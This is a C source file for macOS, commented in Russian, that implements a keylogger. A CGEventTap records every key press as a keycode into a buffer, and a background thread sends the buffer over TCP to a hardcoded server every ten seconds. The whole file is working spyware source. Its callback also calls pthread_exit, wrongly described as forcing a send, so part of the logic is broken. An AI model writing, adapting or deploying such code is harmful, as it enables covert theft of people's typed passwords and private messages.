#include <ApplicationServices/ApplicationServices.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#define SERVER_IP "127.0.0.1" // IP-адрес сервера (локальный хост)
#define SERVER_PORT 65534     // Порт для подключения к серверу
#define BUFFER_LIMIT 50       // Лимит символов в буфере перед отправкой
#define SEND_INTERVAL 10      // Интервал отправки данных на сервер (в секундах)

char log_buffer[1024];        // Буфер для хранения зарегистрированных клавиш
int buffer_index = 0;         // Индекс текущей позиции в буфере
pthread_mutex_t buffer_mutex; // Мьютекс для синхронизации доступа к буферу

// Функция отправки данных на сервер
void *send_logs(void *arg) {
    while (1) {
        sleep(SEND_INTERVAL); // Ждем заданный интервал времени

        pthread_mutex_lock(&buffer_mutex); // Блокируем доступ к буферу

        if (buffer_index > 0) { // Если в буфере есть данные для отправки
            int sock = socket(AF_INET, SOCK_STREAM, 0); // Создаем TCP-сокет
            if (sock < 0) {
                perror("Ошибка создания сокета");
                pthread_mutex_unlock(&buffer_mutex);
                continue;
            }

            struct sockaddr_in server_addr;   // Структура для адреса сервера
            server_addr.sin_family = AF_INET;   // Используем IPv4
            server_addr.sin_port = htons(SERVER_PORT);    // Указываем порт сервера
            inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr); // Преобразуем IP-адрес в нужный формат

            if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
                send(sock, log_buffer, buffer_index, 0);     // Отправляем данные из буфера на сервер
                buffer_index = 0;       // Очищаем буфер после успешной отправки
            } else {
                perror("Ошибка подключения к серверу");
            }
            close(sock);         // Закрываем сокет после использования
        }

        pthread_mutex_unlock(&buffer_mutex);    // Разблокируем доступ к буферу
    }
    return NULL;
}

// Функция обратного вызова для обработки событий клавиатуры
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *userData) {
    if (type == kCGEventKeyDown) {            // Проверяем тип события: нажатие клавиши
        pthread_mutex_lock(&buffer_mutex);      // Блокируем доступ к буферу

        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        buffer_index += snprintf(log_buffer + buffer_index, sizeof(log_buffer) - buffer_index, "%d ", keyCode);

        if (buffer_index >= BUFFER_LIMIT) {     // Если буфер заполнен до лимита символов
            pthread_mutex_unlock(&buffer_mutex);   // Разблокируем мьютекс перед отправкой данных
            pthread_exit(NULL);   // Принудительная отправка данных (завершение потока)
        }

        pthread_mutex_unlock(&buffer_mutex);   // Разблокируем доступ к буферу после записи данных
    }
    return event;
}

int main() {
    pthread_t sender_thread;   // Поток для отправки данных на сервер
    pthread_create(&sender_thread, NULL, send_logs, NULL);   // Создаем поток отправки данных

    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);    // Маска событий для перехвата нажатий клавиш

    CFMachPortRef eventTap = CGEventTapCreate(
            kCGSessionEventTap,
            kCGHeadInsertEventTap,
            kCGEventTapOptionDefault,
            eventMask,
            eventCallback,
            NULL // Передаем NULL в качестве пользовательских данных
    );

    if (!eventTap) {                                            // Проверяем успешность создания Event Tap
        fprintf(stderr, "Не удалось создать Event Tap.\n");
        exit(1);
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);   // Включаем Event Tap для обработки событий клавиатуры

    CFRunLoopRun();  // Запускаем цикл обработки событий

    return 0;
}
